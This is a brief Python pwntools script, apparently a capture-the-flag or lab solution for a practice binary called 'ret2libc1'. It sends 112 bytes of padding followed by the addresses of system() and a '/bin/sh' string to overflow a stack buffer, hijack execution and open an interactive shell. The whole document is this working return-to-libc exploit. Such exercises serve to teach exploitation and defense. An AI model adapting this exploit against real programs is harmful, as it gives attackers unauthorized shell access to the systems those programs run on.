from pwn import *

p=process('./ret2libc1')

bin_sh=0x08048720

sys_adr=0x08048460

#payload=flat('a'*112,sys_adr,'b'*4,bin_sh)

payload='a'*112+p32(sys_adr)+'b'*4+p32(bin_sh)

p.sendline(payload)

p.interactive()
